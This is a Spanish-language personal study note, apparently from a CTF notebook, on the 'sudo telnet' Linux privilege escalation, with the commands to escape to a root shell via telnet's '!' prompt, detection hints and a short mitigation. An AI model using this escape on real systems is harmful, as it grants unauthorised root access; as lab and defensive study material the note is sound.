---
tags: [tecnica, escalada-linux, sudo, telnet]
tipo: tecnica
categoria: escalada-linux
estado: practicado
maquinas: [SuraxCorp]
---

# Sudo Telnet

## 1. Qué es

`telnet` con `sudo` permite escapar a shell mediante su comando `!` (escape al shell del cliente).

## 2. Cómo funciona

- Dentro de `telnet`: `!/bin/sh` ejecuta una shell como el usuario del `sudo` (root).

## 3. Cuándo sospecharla

- `sudo -l` incluye `telnet`.

## 4. Cómo comprobarla (laboratorio autorizado)

```bash
sudo telnet
# en el prompt de telnet:
!/bin/sh
id
```

## 5. Herramientas

- [[GTFOBins]].

## 6. Ejemplos en mis CTF

| Máquina | Contexto | Resultado |
|---|---|---|
| [[SuraxCorp]] | `sudo telnet` como escalada final | root |

## 7. Falsos positivos / pruebas fallidas

- Si el escape `!` está deshabilitado, no aplica.

## 8. Prevención y mitigación

- No conceder clientes interactivos en `sudoers`.

## 9. Técnicas relacionadas

- [[GTFOBins]], [[SUID]]
